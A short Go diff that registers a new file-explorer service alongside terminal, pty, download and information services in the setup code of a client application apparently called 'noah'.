@@ -8,6 +8,7 @@ import (
 	"noah/client/app/handler"
 	"noah/client/app/service"
 	"noah/client/app/service/download"
+	"noah/client/app/service/explorer"
 	"noah/client/app/service/information"
 	"noah/client/app/service/pty"
 	"noah/client/app/service/terminal"
@@ -25,10 +26,11 @@ func New(configuration *environment.Configuration) *App {
 	clientGateway := client.NewGateway(configuration, httpClient)
 
 	clientServices := &service.Services{
-		Information: information.NewService(),
-		Terminal:    terminal.NewService(),
-		Pty:         pty.NewService(),
-		Download:    download.NewService(clientGateway),
+		Information:  information.NewService(),
+		Terminal:     terminal.NewService(),
+		Pty:          pty.NewService(),
+		Download:     download.NewService(clientGateway),
+		FileExplorer: explorer.NewService(),
 	}
 
 	return &App{
